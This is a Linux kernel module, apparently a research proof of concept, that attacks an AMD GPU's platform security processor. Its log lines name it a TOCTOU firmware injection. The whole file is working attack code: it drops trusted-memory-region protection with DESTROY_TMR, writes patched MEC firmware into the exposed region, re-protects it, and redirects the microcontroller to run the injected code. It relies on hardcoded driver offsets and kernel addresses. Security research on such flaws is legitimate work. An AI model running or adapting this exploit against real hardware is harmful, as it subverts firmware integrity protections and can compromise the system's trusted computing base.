#include <linux/module.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

struct psp_cmd {
    u32 buf_size, buf_version, cmd_id;
    u32 r1,r2,r3,r4;
    u32 data[32];
    u32 resp[16];
};
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);

static int __init ti_init(void) {
    struct pci_dev *p = pci_get_device(0x1002, 0x1586, NULL);
    void *adev, *psp;
    psp_fn submit;
    rreg_fn rreg;
    wreg_fn wreg;
    struct psp_cmd *cmd;
    u64 fence_mc, tmr_mc;
    u32 gc;
    void __iomem *tmr_map;
    void *fw_buf = NULL;
    ssize_t fw_size = 0;
    int ret;

    if (!p) return -ENODEV;
    adev = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)adev + 0x3B910;
    fence_mc = *(u64*)((u8*)psp + 0x1B8);
    tmr_mc = *(u64*)((u8*)psp + 0x190);
    submit = (psp_fn)0xFFFFFFFFC0F2F840ULL;
    rreg = (rreg_fn)0xFFFFFFFFC0E02460ULL;
    wreg = (wreg_fn)0xFFFFFFFFC0E02820ULL;
    gc = 0x2800;
    cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("ti: === TOCTOU FIRMWARE INJECTION ===\n");

    /* Pre-load firmware into kernel buffer */
    {
        struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
        if (IS_ERR(fp)) { pr_info("ti: no fw file\n"); goto done; }
        fw_buf = kmalloc(0x6E000, GFP_KERNEL);
        if (!fw_buf) { filp_close(fp, NULL); goto done; }
        {
            loff_t pos = 0;
            fw_size = kernel_read(fp, fw_buf, 0x6E000, &pos);
        }
        filp_close(fp, NULL);
        pr_info("ti: Loaded %zd bytes of firmware\n", fw_size);
    }

    /* PATCH the firmware at PC=0x800 */
    {
        u32 *code = (u32*)((u8*)fw_buf + 0x4000);
        pr_info("ti: Orig [0x800]: %08X %08X %08X %08X\n",
            code[0], code[1], code[2], code[3]);
        code[0] = 0x00000013; /* NOP */
        code[1] = 0x00000013;
        code[2] = 0x00000013;
        code[3] = 0xFF5FF06F; /* JAL loop */
    }

    /* Pre-map TMR physical address */
    tmr_map = ioremap_wc(0x2060000000ULL, 0x100000); /* 1MB */
    if (!tmr_map) { pr_info("ti: TMR ioremap failed\n"); goto done; }

    /* Verify TMR is currently protected */
    {
        u32 v = readl(tmr_map);
        pr_info("ti: TMR before destroy: 0x%08X%s\n", v,
            v == 0xFFFFFFFF ? " PROTECTED" : " already accessible!");
    }

    /* === THE ATTACK === */

    /* Step 1: DESTROY_TMR — drops DF protection */
    pr_info("ti: Step 1: DESTROY_TMR...\n");
    memset(cmd, 0, sizeof(*cmd));
    cmd->buf_size = sizeof(*cmd); cmd->buf_version = 1;
    cmd->cmd_id = 0x07;
    ret = submit(psp, NULL, cmd, fence_mc);
    pr_info("ti: DESTROY ret=%d resp=0x%X\n", ret, cmd->resp[0]);

    /* Step 2: IMMEDIATELY write patched firmware to TMR! */
    {
        u32 v = readl(tmr_map);
        pr_info("ti: TMR after destroy: 0x%08X%s\n", v,
            v == 0xFFFFFFFF ? " STILL PROTECTED" : " *** WRITABLE! ***");

        if (v != 0xFFFFFFFF) {
            /* TMR is accessible! Write firmware code section */
            u32 *src = (u32*)((u8*)fw_buf + 0x2000);
            int code_words = (fw_size - 0x2000) / 4;
            int i;

            pr_info("ti: Writing %d words of patched firmware to TMR...\n",
                code_words);
            for (i = 0; i < code_words && i < 0x40000; i++)
                writel(src[i], tmr_map + i * 4);
            wmb();

            /* Verify */
            {
                u32 v0 = readl(tmr_map);
                u32 v800 = readl(tmr_map + 0x800 * 4);
                pr_info("ti: TMR[0]=0x%08X (expect 0x04070663)\n", v0);
                pr_info("ti: TMR[0x800]=0x%08X (expect NOP=0x00000013)\n", v800);

                if (v0 == 0x04070663 && v800 == 0x00000013)
                    pr_info("ti: *** PATCHED FIRMWARE WRITTEN TO TMR! ***\n");
            }

            /* Step 3: SETUP_TMR — re-establish protection over our firmware */
            pr_info("ti: Step 3: SETUP_TMR...\n");
            memset(cmd, 0, sizeof(*cmd));
            cmd->buf_size = sizeof(*cmd); cmd->buf_version = 1;
            cmd->cmd_id = 0x05;
            cmd->data[0] = lower_32_bits(tmr_mc);
            cmd->data[1] = upper_32_bits(tmr_mc);
            cmd->data[2] = 0x08C00000; /* 140MB */
            ret = submit(psp, NULL, cmd, fence_mc);
            pr_info("ti: SETUP_TMR ret=%d\n", ret);

            /* Step 4: Program IC_BASE to point to TMR firmware */
            pr_info("ti: Step 4: Setting IC_BASE...\n");
            wreg(adev, gc + 0x2812, lower_32_bits(tmr_mc));
            wreg(adev, gc + 0x2813, upper_32_bits(tmr_mc));
            udelay(200);
            {
                u32 lo = rreg(adev, gc + 0x2812);
                u32 hi = rreg(adev, gc + 0x2813);
                pr_info("ti: IC_BASE = 0x%08X_%08X\n", hi, lo);
            }

            /* Step 5: IC invalidate + set PRGRM_CNTR_START + unhalt */
            {
                u32 ic_op = rreg(adev, gc + 0x2815);
                wreg(adev, gc + 0x2808, (1 << 30)); /* halt */
                udelay(2000);
                wreg(adev, gc + 0x2815, ic_op | 1); /* IC invalidate */
                udelay(2000);
                wreg(adev, gc + 0x2900, 0x800); /* PRGRM_CNTR_START */
                udelay(100);
                wreg(adev, gc + 0x2808, 0); /* unhalt */
                mdelay(200);

                {
                    u32 pc = rreg(adev, gc + 0x2908);
                    u32 s0 = rreg(adev, gc + 0x3460);
                    pr_info("ti: *** RESULT: PC=0x%04X SCRATCH0=0x%08X ***\n",
                        pc, s0);
                    if (pc >= 0x800 && pc <= 0x803)
                        pr_info("ti: ******* MEC EXECUTING PATCHED CODE! *******\n");
                    else if (pc != 0)
                        pr_info("ti: MEC alive at PC=0x%04X\n", pc);
                    else
                        pr_info("ti: MEC dead (PC=0)\n");
                }
            }
        }
    }

    iounmap(tmr_map);
done:
    kfree(fw_buf);
    kfree(cmd);
    pci_dev_put(p);
    return 0;
}
static void __exit ti_exit(void) { pr_info("ti: unloaded\n"); }
module_init(ti_init); module_exit(ti_exit);
